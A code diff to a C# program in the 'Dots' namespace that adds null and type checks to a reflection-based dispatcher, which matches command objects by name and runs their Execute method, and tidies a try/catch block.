@@ -4,7 +4,6 @@ using System.Reflection;
 using System.Text;
 using System.Threading;
 
-
 namespace Dots
 {
     public class Program
@@ -60,8 +59,22 @@ namespace Dots
                 try
                 {
                     Type commandType = command.GetType();
-                    string name = (string)commandType.GetProperty("Name").GetValue(command);
+
+                    PropertyInfo nameProperty = commandType.GetProperty("Name");
+                    if (nameProperty == null || nameProperty.PropertyType != typeof(string))
+                    {
+                        // The command object does not have a valid "Name" property
+                        continue;
+                    }
+
                     MethodInfo executeMethod = commandType.GetMethod("Execute");
+                    if (executeMethod == null)
+                    {
+                        // The command object does not have a valid "Execute" property
+                        continue;
+                    }
+
+                    string name = (string)nameProperty.GetValue(command);
 
                     if (name == task.Method)
                     {
@@ -86,7 +99,9 @@ namespace Dots
                         _taskManager.SendResult(Result);
                         return;
                     }
-                } catch (Exception ex)
+
+                }
+                catch (Exception ex)
                 {
 
                     TaskError failedToExecuteError = new TaskError
